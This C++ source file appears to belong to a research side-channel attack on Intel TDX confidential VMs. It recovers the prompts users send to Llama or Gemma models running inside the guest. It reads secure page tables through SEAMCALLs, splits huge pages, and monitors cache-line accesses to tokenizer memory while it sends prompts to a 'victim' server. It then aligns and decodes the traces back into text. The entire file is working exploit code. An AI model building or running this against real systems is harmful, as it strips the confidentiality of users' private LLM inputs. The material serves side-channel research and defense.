#include "ttoolbox.h"
#include <cstdio>
#include <cstddef>
#include <cstring>
#include <cstdlib>
#include <map>
#include <set>
#include <algorithm>
#include <cassert>
#include <string>
#include <ranges>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <vector>
#include <iterator>

#include "tdxutils.h"
#include "gpa-sync.h"
#include "libtokenize.h"
#include "sequence-analysis.h"
#include "recovery.h"

struct page_alignment_container {
    unsigned long gpa{};
    unsigned long block_id{};

    page_alignment_container() = default;
    page_alignment_container(unsigned long block_id, unsigned long gpa) : gpa(gpa), block_id(block_id) {}
    bool operator==(const page_alignment_container &o) const { return gpa == o.gpa; }
};

static constexpr model_specific_configuration model_llama = {
    .model = MODEL_LLAMA,
    .trail_length = 2,
    .start_header_printable = "user",
    .end_header_printable = "assistant",
    .start_header = "<|start_header_id|>user<|end_header_id|>\n\n",
    .end_header = "<|eot_id|><|start_header_id|>assistant<|end_header_id|>\n\n",
};

static constexpr model_specific_configuration model_gemma = {
    .model = MODEL_GEMMA,
    .trail_length = 2,
    .start_header_printable = "user",
    .end_header_printable = "model",
    .start_header = "<start_of_turn>user",
    .end_header = "<end_of_turn>\n<start_of_turn>model",
};

const model_specific_configuration* target_model = &model_llama;
static constexpr unsigned char SCORE_THRESHOLD = 130;
static std::set<unsigned long> correct_pages;
static std::set<unsigned long> correct_tokens;
std::vector<unsigned long> target_gpas;
static std::vector<gpa_sync_entry> dict_tokens;
std::map<unsigned long, gpa_sync_entry> id_to_token;
std::map<unsigned long, gpa_sync_entry> gpa_to_token;
static std::map<unsigned long, std::vector<gpa_sync_entry> > buckets;
unsigned long sync_gpa = 0;
static unsigned long termination_gpa = 0;

template<typename T, typename It>
static T seq_max(It begin, const It &end) {
    T ret = *begin;

    while (begin++ != end)
        ret = std::max(ret, *begin);

    return ret;
}

static unsigned long gpa_to_hpa(int util_fd, unsigned long gpa) {
    unsigned long rc, level = 0;
    tdx_sept_entry entry;

    // First try to resolve as a 2MB page
    rc = seamcall_tdh_mem_sept_rd(util_fd, 1, gpa & ~((1ul << 21) - 1), tdr_pa,
                                  reinterpret_cast<unsigned long *>(&entry), &level);
    if (rc != TDX_SUCCESS)
        return ~0ul;

    // This is indeed a 2MB page - return result
    if (entry.leaf)
        return (entry.pfn << 12) | (gpa & ((1ul << 21) - 1));

    // Resolve as a 4kB page instead
    rc = seamcall_tdh_mem_sept_rd(util_fd, 0, gpa, tdr_pa, reinterpret_cast<unsigned long *>(&entry), nullptr);
    if (rc != TDX_SUCCESS)
        return ~0ul;

    return (entry.pfn << 12) | (gpa & 0xfff);
}

void send_buffer(int client_fd, const unsigned char *buf, unsigned long len) {
    unsigned long sent = 0;

    do {
        auto ret = send(client_fd, buf + sent, len - sent, 0);
        if (ret < 0) {
            perror("send");
            exit(EXIT_FAILURE);
        }
        sent += static_cast<unsigned long>(ret);
    } while (sent < len);
}

int connect_to_victim() {
    int sock = 0;
    sockaddr_in serv_addr {};

    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket failed");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Convert IPv4/IPv6 addresses from text to binary
    if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sock);
        return -1;
    }

    // Connect to server
    if (connect(sock, reinterpret_cast<sockaddr *>(&serv_addr), sizeof(serv_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    return sock;
}

static unsigned char get_page_level(int util_fd, unsigned long gpa) {
    tdx_sept_entry entry{};
    unsigned long rc;

    // Align to 2MB boundary for checking
    gpa = gpa & ~((1ul << 21) - 1);

    rc = seamcall_tdh_mem_sept_rd(util_fd, 1, gpa, tdr_pa, reinterpret_cast<unsigned long *>(&entry), nullptr);
    if (rc != TDX_SUCCESS) {
        fprintf(stderr, "Error - Could not resolve GPA 0x%lx! Make sure it is valid.\n", gpa);
        return 0; // Return 0 (4KB) as default
    }

    return entry.leaf ? 1 : 0; // 1 = 2MB page, 0 = 4KB page
}

static int split_huge_pages(int util_fd, unsigned long start_gpa, unsigned long end_gpa) {
    tdx_split_huge_pages_req req = {
        .tdr_pa = tdr_pa,
        .start_gpa = start_gpa,
        .end_gpa = end_gpa,
        .target_level = 0 // PG_LEVEL_4K
    };

    if (ioctl(util_fd, IOCTL_TDX_SPLIT_HUGE_PAGES, &req) < 0) {
        perror("ioctl IOCTL_TDX_SPLIT_HUGE_PAGES");
        return -1;
    }

    return 0;
}

unsigned int split_target_pages(int util_fd, const std::vector<unsigned long> &gpas) {
    std::set<unsigned long> huge_gpas;
    std::set<unsigned long> test_gpas;

    for (auto gpa: gpas)
        test_gpas.insert(level_align(gpa, 1));

    // Get all GPAs that need to be split
    for (auto gpa: test_gpas) {
        auto level = get_page_level(util_fd, gpa);
        if (level != 1)
            continue;

        huge_gpas.insert(gpa);
    }

    // Split them
    for (auto huge_gpa: huge_gpas)
        split_huge_pages(util_fd, huge_gpa, huge_gpa + level_pg_size(1));

    return huge_gpas.size();
}

bool verify_target_page_level(int util_fd, const std::vector<unsigned long> &gpas) {
    return std::ranges::all_of(gpas.begin(), gpas.end(),
                               [util_fd](auto gpa) {
                                   return get_page_level(util_fd, gpa & ~(PAGE_SIZE - 1)) == 0;
                               }
    );
}

static tdx_access_monitor_targets *build_target_struct(int util_fd, const std::vector<gpa_sync_entry> &tokens) {
    std::set<unsigned long> target_pages;
    std::set<unsigned long> blacklist_pages;

    if (target_model->model == MODEL_GEMMA) {
        std::array<unsigned long, 1> gemma_blacklist_tokens = {
            5088, // (block)
        };
        for (const auto token: gemma_blacklist_tokens) {
            blacklist_pages.insert(level_align(id_to_token[token].gpa, TDX_LEVEL_4K));
        }

        blacklist_pages.insert(level_align(sync_gpa, TDX_LEVEL_4K) + level_pg_size(TDX_LEVEL_4K));
        blacklist_pages.insert(level_align(sync_gpa, TDX_LEVEL_4K) - level_pg_size(TDX_LEVEL_4K));
    }

    for (const auto &token: tokens) {
        const auto page = level_align(token.gpa, TDX_LEVEL_4K);
        if (blacklist_pages.contains(page))
            continue;
        target_pages.emplace(page);
    }

    auto *target_buf = new unsigned char [
        offsetof(tdx_access_monitor_targets, targets) + sizeof(tdx_access_monitor_target_page) * target_pages.size()];
    auto *ret = reinterpret_cast<tdx_access_monitor_targets *>(target_buf);

    *ret = {
        .sync_gpa = level_align(sync_gpa, TDX_LEVEL_4K),
        .sync_level = TDX_LEVEL_4K,
        .sync_hpa = level_align(gpa_to_hpa(util_fd, sync_gpa), TDX_LEVEL_4K),
        .termination_gpa = termination_gpa,
        .termination_level = 0,
        .access_type = TDX_ACCESS_TYPE_TSX,
        .trail_length = target_model->trail_length,
        .hit_tsc_threshold_upper = 0, // Not relevant with TSX
        .hit_tsc_threshold_lower = 0, // Not relevant with TSX
        .tdr_pa = tdr_pa,
        .num_targets = target_pages.size(),
        .pmc = {{.raw = 0}, 0},
        .targets = {},
    };

    unsigned int i = 0;
    for (const auto target_page: target_pages) {
        ret->targets[i++] = {
            .hpa = gpa_to_hpa(util_fd, target_page),
            .level = 0,
            .gpa = target_page,
        };
    }

    return ret;
}

int monitor_all_tokens(int util_fd, int victim_fd, const char *prompt,
                              std::vector<tdx_access_monitor_hit> &accesses) {
    char response[0x1000];

    auto *targets = build_target_struct(util_fd, dict_tokens);
    tdx_access_monitor_hit hits[0x1000];
    tdx_access_monitor_query query = {
        .dest_len = std::size(hits),
        .dest = hits,
        .num_items = 0,
    };

    ssize_t status = ioctl(util_fd, IOCTL_TDX_ACCESS_MONITOR_START, targets);
    if (status < 0) {
        perror("IOCTL_TDX_ACCESS_MONITOR_START");
        exit(EXIT_FAILURE);
    }
    delete [] targets;

    send_buffer(victim_fd, reinterpret_cast<const unsigned char *>(prompt), strlen(prompt) + 1);
    status = recv(victim_fd, response, sizeof(response), 0);

    status = ioctl(util_fd, IOCTL_TDX_ACCESS_MONITOR_STOP);
    if (status < 0) {
        perror("IOCTL_TDX_ACCESS_MONITOR_STOP");
        exit(EXIT_FAILURE);
    }

    do {
        status = ioctl(util_fd, IOCTL_TDX_ACCESS_MONITOR_QUERY, &query);
        if (status < 0) {
            perror("IOCTL_TDX_ACCESS_MONITOR_QUERY");
            exit(EXIT_FAILURE);
        }

        std::sort(query.dest, query.dest + query.num_items, [](const auto &a, const auto &b) { return a.gpa < b.gpa; });
        accesses.insert(accesses.end(), query.dest, query.dest + query.num_items);
    } while (query.num_items > 0);

    std::set<unsigned long> ids;
    for (const auto &access: accesses)
        ids.insert(access.block_id);

    return 0;
}

gpa_sync *get_token_addresses(int victim_fd) {
    unsigned long size = 0, received = 0;
    gpa_sync header{};
    auto ret = recv(victim_fd, &header, offsetof(struct gpa_sync, tokens), 0);
    if (ret <= 0) {
        perror("recv");
        exit(EXIT_FAILURE);
    }

    size = header.num_tokens;
    auto *token_buffer = new unsigned char [size * sizeof(gpa_sync_entry) + offsetof(gpa_sync, tokens)];
    auto *token_sync = reinterpret_cast<gpa_sync *>(token_buffer);
    memcpy(token_sync, &header, offsetof(struct gpa_sync, tokens));

    do {
        ret = recv(victim_fd, token_buffer + offsetof(gpa_sync, tokens) + received,
                   size * sizeof(gpa_sync_entry) - received, 0);
        if (ret < 0) {
            perror("recv");
            exit(EXIT_FAILURE);
        }

        received += static_cast<unsigned long>(ret);
    } while (received < size * sizeof(gpa_sync_entry));

    return token_sync;
}

struct bucket_cmp {
    bool operator ()(const gpa_sync_entry &a, const gpa_sync_entry &b) const {
        return a.bucket_pos < b.bucket_pos;
    }
};

void init_tokens(const gpa_sync *token_sync, bool verbose) {
    std::set<unsigned long> pages;

    if (token_sync->num_tokens <= 128256)
        target_model = &model_llama;
    else
        target_model = &model_gemma;

    printf("Selecting model %u\n",target_model->model);

    for (unsigned int i = 0; i < token_sync->num_tokens; i++) {
        dict_tokens.emplace_back(token_sync->tokens[i]);
        target_gpas.emplace_back(token_sync->tokens[i].gpa);
        id_to_token[token_sync->tokens[i].token_id] = token_sync->tokens[i];
        gpa_to_token[token_sync->tokens[i].gpa & ~0x3ful] = token_sync->tokens[i];
        buckets[token_sync->tokens[i].bucket_id].emplace_back(token_sync->tokens[i]);

        pages.insert(level_align(token_sync->tokens[i].gpa, 0));
    }

    for (auto &bucket: buckets)
        std::ranges::sort(bucket.second, bucket_cmp{});

    target_gpas.emplace_back(token_sync->tokenizer_code_gpa);
    sync_gpa = level_align(token_sync->tokenizer_code_gpa, 0);
    target_gpas.emplace_back(token_sync->sampling_code_gpa);
    termination_gpa = level_align(token_sync->sampling_code_gpa, 0);

    if (verbose)
        printf("There are %lu tokens in %lu buckets, distributed across %lu 4kB pages\n", dict_tokens.size(),
               buckets.size(), pages.size());
}

static const char *get_confidence_color(unsigned char score) {
    if (score <= 50)
        return CRED;
    if (score >= 200)
        return CMAG;
    if (score >= 100)
        return CGRN;
    return CCYN;
}

static void build_aux_data_structures(const std::vector<tdx_access_monitor_hit> &accesses,
                                      std::map<unsigned long, std::vector<tdx_access_monitor_hit> > &snapshots,
                                      std::vector<std::pair<unsigned long, unsigned long> > &pages) {
    std::set<unsigned long> block_id_set;
    for (const auto &access: accesses) {
        if (access.access_type == TDX_ACCESS_TYPE_NONE && level_align(access.gpa, TDX_LEVEL_4K) != sync_gpa) {
            gpa_to_token[access.gpa] = {
                .token_string = "DummyToken",
                .token_id = access.gpa | (1ul << 63) | 0x20,
                .gpa = access.gpa,
                .bucket_id = 0xffffff,
                .bucket_pos = 0xff,
            };
            id_to_token[access.gpa | (1ul << 63)] = gpa_to_token[access.gpa];
            buckets[0xffffff].emplace_back(gpa_to_token[access.gpa]);
        }
        else if (!gpa_to_token.contains(access.gpa)) {
            if (level_align(access.gpa, TDX_LEVEL_4K) == sync_gpa) {
                gpa_to_token[access.gpa] = {
                    .token_string = "SyncToken",
                    .token_id = access.gpa | (1ul << 63) | 0x20,
                    .gpa = access.gpa,
                    .bucket_id = 0xffffff,
                    .bucket_pos = 0xff,
                };
                id_to_token[access.gpa | (1ul << 63)] = gpa_to_token[access.gpa];
                buckets[0xffffff].emplace_back(gpa_to_token[access.gpa]);
            } else
                continue;
        }


        const auto *s = gpa_to_token[access.gpa].token_string;
        if (s[0] == '<' && s[1] == '|' && strcmp(s, "<|begin_of_text|>") != 0)
            continue;


        snapshots[access.block_id].emplace_back(access);
        block_id_set.insert(access.block_id);
    }
    std::vector block_ids(block_id_set.begin(), block_id_set.end());
    std::ranges::sort(block_ids);

    for (const auto id: block_ids)
        pages.emplace_back(id, level_align(snapshots[id][0].gpa, 0));
}

static std::vector<page_accesses> get_page_accesses(const std::vector<tdx_access_monitor_hit> &accesses) {
    std::vector<std::pair<unsigned long, unsigned long> > pages;
    std::map<unsigned long, std::vector<tdx_access_monitor_hit> > snapshots;

    build_aux_data_structures(accesses, snapshots, pages);
    std::vector<page_accesses> page_accesses;

    unsigned long frame_diff = 0, last_tsc = 0, cur_tsc = 0;
    for (auto &p: pages) {
        auto cls = snapshots[p.first] | std::ranges::views::transform([](const auto &hit) { return hit.gpa; });
        std::set orig_accesses(cls.begin(), cls.end());
        std::set cl_accesses(cls.begin(), cls.end());

        last_tsc = cur_tsc;
        cur_tsc = p.first;

        if (p.second == sync_gpa)
            frame_diff = p.first - last_tsc;

        for (const auto &hit: snapshots[p.first]) {
            auto cl_offset = gpa_to_token[hit.gpa].gpa & 0x3f;
            if (cl_offset >= 0x20 && gpa_to_token.contains(hit.gpa - 0x40))
                cl_accesses.insert(hit.gpa - 0x40);

            if (cl_offset <= 0x20 && gpa_to_token.contains(hit.gpa + 0x40))
                cl_accesses.insert(hit.gpa + 0x40);

        }
        page_accesses.emplace_back(
            p.second,
            cl_accesses,
            orig_accesses,
            p.first,
            frame_diff
        );
    }

    std::ranges::sort(page_accesses, [](const auto& a, const auto& b){return a.timestamp < b.timestamp;});

    return page_accesses;
}

std::tuple<unsigned long, unsigned char, const char *> get_best_token(const page_accesses &access) {
    std::pair<unsigned long, unsigned char> max = std::make_pair(0, 0);

    for (const auto& p: access.accessed_cls) {
        if (!max.second || p.second > max.second)
            max = p;
    }

    if (!max.first)
        return std::make_tuple(0, 0, "");

    return std::make_tuple(max.first, max.second, gpa_to_token[max.first].token_string);
}

static std::vector<page_accesses> isolate_prompt_llama(const std::vector<page_accesses> &access_trace, bool verbose) {
    auto aligned = align_repeating_tokenizations(access_trace, verbose);
    if (verbose) {
        auto merged_pessimistic = pessimistic_merge(aligned);
        printf("Pessimistic Merge:\n" CGRN);
        print_decoded_accesses(merged_pessimistic);
        printf(CRESET "\n");
        fflush(stdout);
    }

    auto merged_optimistic = optimistic_merge(aligned);
    if (verbose) {
        printf("Optimistic Merge:\n" CCYN);
        print_decoded_accesses(merged_optimistic);
        printf(CRESET "\n");
        fflush(stdout);
    }

    auto& page_accesses = merged_optimistic;
    constexpr std::array<unsigned int, 2> stop_tokens = {
        271, // ĊĊ
        272,
    };
    constexpr std::array<unsigned int, 1> start_tokens = {
        78191,
    };
    std::set<unsigned long> stop_pages;
    std::set<unsigned long> start_pages;
    std::set<unsigned long> stop_cls;
    std::vector<struct page_accesses> work_seq;

    if (page_accesses.empty())
        return {};

    for (const auto token: start_tokens)
        start_pages.insert(level_align(id_to_token[token].gpa, TDX_LEVEL_4K));

    for (const auto token: stop_tokens) {
        stop_pages.insert(level_align(id_to_token[token].gpa, TDX_LEVEL_4K));
        stop_cls.insert(id_to_token[token].gpa & ~0x3ful);
    }

    auto start = false;
    for (auto it = page_accesses.rbegin(); it != page_accesses.rend(); ++it) {
        if (!start) {
            if (start_pages.contains(it->gpa))
                start = true;
            continue;
        }

        if (!stop_pages.contains(it->gpa)) {
            auto t = get_best_token(*it);
            if (std::get<1>(t) >= SCORE_THRESHOLD)
                work_seq.insert(work_seq.begin(), *it);
            continue;
        }

        auto check = false;
        for (auto cl: it->accessed_cls | std::views::keys) {
            if (stop_cls.contains(cl)) {
                check = true;
                break;
            }
        }

        if (check)
            break;

        auto t = get_best_token(*it);
        if (std::get<1>(t) >= SCORE_THRESHOLD)
            work_seq.insert(work_seq.begin(), *it);
    }

    return work_seq;
}

std::vector<page_accesses> isolate_prompt_gemma(const std::vector<page_accesses> &access_trace, bool verbose) {
    auto aligned = align_repeating_tokenizations(access_trace, verbose);
    if (verbose) {
        auto merged_pessimistic = pessimistic_merge(aligned);
        printf("Pessimistic Merge:\n" CGRN);
        print_decoded_accesses(merged_pessimistic);
        printf(CRESET "\n");
        fflush(stdout);
    }

    auto merged_optimistic = optimistic_merge(aligned);
    if (verbose) {
        printf("Optimistic Merge:\n" CCYN);
        print_decoded_accesses(merged_optimistic);
        printf(CRESET "\n");
        fflush(stdout);
    }

    auto& page_accesses = merged_optimistic;
    constexpr std::array<unsigned int, 1> start_tokens = {
        1289, // (mo)
    };
    constexpr std::array<unsigned int, 1> end_trim_tokens = {
        5089, // (_users)
    };

    std::map<unsigned long, unsigned long> page_occurrence_count;
    for (const auto& page_access: page_accesses)
        page_occurrence_count[page_access.gpa]++;

    std::set<unsigned long> start_pages;
    std::set<unsigned long> trim_pages;
    std::set<unsigned long> stop_cls;
    std::vector<struct page_accesses> work_seq;

    if (page_accesses.empty())
        return {};

    for (const auto token: start_tokens)
        start_pages.insert(level_align(id_to_token[token].gpa, TDX_LEVEL_4K));
    for (const auto token: end_trim_tokens)
        trim_pages.insert(level_align(id_to_token[token].gpa, TDX_LEVEL_4K));

    auto start = false;
    auto trim = true;
    for (auto it = page_accesses.rbegin(); it != page_accesses.rend(); ++it) {
        if (!start) {
            if (start_pages.contains(it->gpa))
                start = true;
            continue;
        }

        if (trim) {
            if (trim_pages.contains(it->gpa))
                continue;
            trim = false;
        }

        auto t = get_best_token(*it);

        // printf("[" CCYN "*" CRESET "] %03lu, 0x%lx, (%s)\n", page_occurrence_count[it->gpa], it->gpa, gpa_to_token[std::get<0>(t)].token_string);

        if (page_occurrence_count[it->gpa] <= 1 && !work_seq.empty())
            break;

        if (std::get<1>(t) >= SCORE_THRESHOLD) {
            work_seq.insert(work_seq.begin(), *it);
            continue;
        }

    }

    return work_seq;
}

std::vector<page_accesses> isolate_prompt(const std::vector<page_accesses> &access_trace, bool verbose) {
    if (target_model->model == MODEL_LLAMA)
        return isolate_prompt_llama(access_trace, verbose);
    return isolate_prompt_gemma(access_trace, verbose);
}

static std::vector<unsigned long> get_correct_sequence_llama(const unsigned long* correct_token_array, unsigned long num_tokens) {
    const std::set<unsigned long> start_tokens = {198, 78191, 128009, 128006};
    const std::set<unsigned long> stop_tokens = {271, };

    std::vector raw( correct_token_array, correct_token_array + num_tokens);
    std::vector<unsigned long> ret;

    bool start = false;
    for (auto it = raw.rbegin(); it != raw.rend(); ++it) {
        if (!start && !start_tokens.contains(*it))
            continue;
        if (!start) {
            start = true;
            while ((it + 1) != raw.rend() && start_tokens.contains(*it))
                ++it;
        }

        if (stop_tokens.contains(*it))
            break;

        ret.insert(ret.begin(), *it);
    }

    return ret;
}

static std::vector<unsigned long> get_correct_sequence_gemma(const unsigned long* correct_token_array, unsigned long num_tokens) {
    unsigned int start_i = 0, end_i = num_tokens;
    const std::set<unsigned long> start_tokens = {
        497, // (er)
        // 105, // (<start_of_turn>)
        2364, // (user)
    };
    const std::set<unsigned long> stop_tokens = {
        1289, // (mo)
        106, // (<end_of_turn>)
    };

    for (unsigned int i = 0; i < num_tokens; i++) {
        if (start_tokens.contains(correct_token_array[i])) {
            start_i = i + 1;
            break;
        }
    }

    for (unsigned int i = num_tokens - 1; i > start_i; i--) {
        if (stop_tokens.contains(correct_token_array[i])) {
            end_i = i;
            break;
        }
    }

    assert(start_i < end_i);

    while (id_to_token[correct_token_array[end_i - 1]].token_string[0] == '<')
        end_i--;

    return {correct_token_array + start_i, correct_token_array + end_i};
}

std::vector<unsigned long> get_correct_sequence(const unsigned long* correct_token_array, unsigned long num_tokens) {
    if (target_model->model == MODEL_LLAMA)
        return  get_correct_sequence_llama(correct_token_array, num_tokens);
    return get_correct_sequence_gemma(correct_token_array, num_tokens);
}

std::vector<unsigned long> get_correct_sequence(const std::vector<unsigned long>& tokens) {
    auto correct_token_array = new unsigned long [tokens.size()];
    for (unsigned int i = 0; i < tokens.size(); i++)
        correct_token_array[i] = tokens[i];

    auto ret = get_correct_sequence(correct_token_array, tokens.size());

    delete [] correct_token_array;
    return ret;
}


static unsigned long get_token_id(unsigned long gpa) {
    return gpa_to_token[gpa].token_id;
}

static AlignmentResult<page_accesses> align_repeating_tokenizations(const std::vector<page_accesses> &page_accesses, double split_ratio) {
    std::vector seq_a_raw(page_accesses.begin(), page_accesses.begin() + static_cast<long>(static_cast<double>(page_accesses.size()) * split_ratio));
    std::vector seq_b_raw(page_accesses.begin() + static_cast<long>(static_cast<double>(page_accesses.size()) * split_ratio), page_accesses.end());

    constexpr auto filter = std::views::filter([](const auto& a) {
        auto t = get_best_token(a);
        return std::get<1>(t) >= SCORE_THRESHOLD && get_token_id(std::get<0>(t)) > 5;
    });
    auto view_a = seq_a_raw | filter;
    auto view_b = seq_b_raw | filter;
    std::vector seq_a(view_a.begin(), view_a.end());
    std::vector seq_b(view_b.begin(), view_b.end());

    return needleman_wunsch(seq_a, seq_b, -1);
}

AlignmentResult<page_accesses> align_repeating_tokenizations(const std::vector<page_accesses> &page_accesses, bool verbose) {
    constexpr std::array split_ratios = {.18, .25, .33, .43, .5, .57, .66, .75, .82};
    const auto mk_alignment= split_ratios | std::views::transform([page_accesses](const auto ratio) {return align_repeating_tokenizations(page_accesses, ratio);});
    const std::vector alignments(mk_alignment.begin(), mk_alignment.end());
    const auto aligned= std::ranges::max_element(alignments, [](const auto& a, const auto& b) {return a.score < b.score;});

    assert(aligned->aligned_seq1.size() == aligned->aligned_seq2.size());
    if (verbose) {
        for (auto i = 0u; i < aligned->aligned_seq1.size(); i++) {
            const auto *s_a = "-";
            const auto *s_b = "-";

            unsigned int id_a = 0;
            unsigned int id_b = 0;

            if (aligned->aligned_seq1[i].has_value()) {
                auto t1 = get_best_token(aligned->aligned_seq1[i].value());
                s_a = std::get<2>(t1);
                id_a = gpa_to_token[std::get<0>(t1)].token_id;
            }

            if (aligned->aligned_seq2[i].has_value()) {
                auto t2 = get_best_token(aligned->aligned_seq2[i].value());
                s_b = std::get<2>(t2);
                id_b = gpa_to_token[std::get<0>(t2)].token_id;
            }

            if (strstr(s_a, "\n") != nullptr)
                s_a = "";
            if (strstr(s_b, "\n") != nullptr)
                s_b = "";

            printf("%-16s (%06u) - %-16s (%06u)\n", s_a, id_a, s_b, id_b);
        }
    }

    return *aligned;
}

// Throw away things we are not sure about
std::vector<page_accesses> pessimistic_merge(AlignmentResult<page_accesses> &aligned) {
    unsigned int i;
    std::vector<page_accesses> ret;

    for (i = 0; i < aligned.aligned_seq1.size(); i++) {
        if (!aligned.aligned_seq1[i].has_value() || !aligned.aligned_seq2[i].has_value())
            continue;

        auto &a1 = aligned.aligned_seq1[i].value();
        auto &a2 = aligned.aligned_seq2[i].value();

        auto v1 = a1.accessed_cls | std::views::keys;
        std::set a1_cls(v1.begin(), v1.end());
        std::set<unsigned long> merged_cls;
        for (const auto cl: a2.accessed_cls | std::views::keys) {
            if (!a1_cls.contains(cl))
                continue;
            merged_cls.insert(cl);
        }
        if (merged_cls.empty())
            continue;

        page_accesses merged(a1.gpa);
        for (const auto cl: merged_cls) {
            auto score = std::max(a1.accessed_cls[cl], a2.accessed_cls[cl]);
            merged.accessed_cls[cl] = score;
        }

        //if (std::get<1>(get_best_token(merged)) < SCORE_THRESHOLD)
        //    continue;

        ret.push_back(merged);
    }

    if (ret.empty())
        return {};

    unsigned int end_pos = ret.size();
    for (i = ret.size() - 1; i; i--) {
        const auto *token_str = gpa_to_token[std::get<0>(get_best_token(ret[i]))].token_string;
        if (strstr(token_str, target_model->end_header_printable) != nullptr) {
            end_pos = i;
            break;
        }
    }

    return {ret.begin(), ret.begin() + end_pos};
}

// Try to use all the information we have without throwing anything away
std::vector<page_accesses> optimistic_merge(AlignmentResult<page_accesses> &aligned) {
    unsigned int i;
    std::vector<page_accesses> ret;

    for (i = 0; i < aligned.aligned_seq1.size(); i++) {
        if (!aligned.aligned_seq1[i].has_value()) {
            ret.push_back(aligned.aligned_seq2[i].value());
            continue;
        }
        if (!aligned.aligned_seq2[i].has_value()) {
            ret.push_back(aligned.aligned_seq1[i].value());
            continue;
        }

        auto a1 = aligned.aligned_seq1[i].value();
        auto &a2 = aligned.aligned_seq2[i].value();

        for (auto cls: a2.accessed_cls) {
            if (!a1.accessed_cls.contains(cls.first)) {
                a1.accessed_cls[cls.first] = cls.second;
                continue;
            }

            a1.accessed_cls[cls.first] = std::max(a1.accessed_cls[cls.first], cls.second);
        }

        ret.push_back(a1);
    }

    if (ret.empty())
        return {};

    unsigned int end_pos = ret.size();
    for (i = ret.size() - 1; i; i--) {
        const auto *token_str = gpa_to_token[std::get<0>(get_best_token(ret[i]))].token_string;
        if (strstr(token_str, target_model->end_header_printable) != nullptr) {
            end_pos = i;
            break;
        }
    }

    return {ret.begin(), ret.begin() + end_pos};
}

std::string decode_accesses(const std::vector<page_accesses> &page_accesses) {
    auto *tkid = new int32_t[page_accesses.size()];
    unsigned int num_tokens = 0, i;

    for (i = 0; i < page_accesses.size(); i++) {
        auto max = get_best_token(page_accesses[i]);

        if (std::get<0>(max) && std::get<1>(max) >= SCORE_THRESHOLD)
            tkid[num_tokens++] = gpa_to_token[std::get<0>(max)].token_id;
    }

    const auto *recovered = libtokenize_tokens_to_string(tkid, num_tokens);
    std::string ret (recovered);
    libtokenize_free_string(recovered);
    delete [] tkid;

    return ret;
}

void print_decoded_accesses(const std::vector<page_accesses> &page_accesses) {
    const auto decoded = decode_accesses(page_accesses);
    printf("%s\n", decoded.c_str());
}

void extract_prompt(const std::vector<tdx_access_monitor_hit> &accesses, bool verbose, std::vector<page_accesses>& out_accesses) {
    auto page_accesses = get_page_accesses(accesses);

    assert(page_accesses.size() > 10);

    if (target_model->model == MODEL_LLAMA)
        apply_filter_chain_llama(page_accesses);
    else
        apply_filter_chain_gemma(page_accesses);

    out_accesses = std::vector(page_accesses.begin(), page_accesses.end());

    if (verbose) {
        std::map<unsigned long, unsigned int> num_occurences;
        for (const auto &page_access: page_accesses)
            num_occurences[page_access.gpa]++;
        unsigned long last_tsc = 0, last_gpa = 0, cur_gpa = 0;
        for (const auto &page_access: page_accesses) {
            last_gpa = cur_gpa;
            cur_gpa = page_access.gpa;
            if (last_gpa == cur_gpa && cur_gpa == sync_gpa)
                continue;

            printf("0x%lx (%03u %c, dtsc 0x%08lx) %c\n", page_access.gpa >> 12, num_occurences[page_access.gpa],
                   page_access.bucket_access ? 'B' : '-', page_access.timestamp - last_tsc,
                   correct_pages.contains(level_align(page_access.gpa, 0)) ? '*' : ' ');
            last_tsc = page_access.timestamp;
            for (auto cl: page_access.accessed_cls)
                printf("  %c (cl %02lx / clo %02lx / bkl %01lu / bkid %05x / bkp %01u / %c / tkid %06lu / ftsc %06lx /confidence %s%03u" CRESET ") %s\n",
                       correct_tokens.contains(gpa_to_token[cl.first].token_id) ? '*' : ' ',
                       (cl.first >> 6) & 0x3f,
                       gpa_to_token[cl.first].gpa & 0x3f,
                       buckets[gpa_to_token[cl.first].bucket_id].size(),
                       gpa_to_token[cl.first].bucket_id,
                       gpa_to_token[cl.first].bucket_pos,
                       page_access.measured_cls.contains(cl.first) ? 'm' : 'a',
                       gpa_to_token[cl.first].token_id > INT32_MAX ? 0 : gpa_to_token[cl.first].token_id,
                       page_access.frame_tsc_diff,
                       get_confidence_color(cl.second),
                       cl.second,
                       strstr(gpa_to_token[cl.first].token_string, "\n") ? "" : gpa_to_token[cl.first].token_string
                );
        }
        printf("\n");
        fflush(stdout);
    }
}

void init_correct_tokens(const int32_t* tokens, unsigned long num_tokens) {
    for (auto i = 0ul; i < num_tokens; i++) {
        correct_tokens.insert(tokens[i]);
        correct_pages.insert(level_align(id_to_token[tokens[i]].gpa, 0));
    }
}
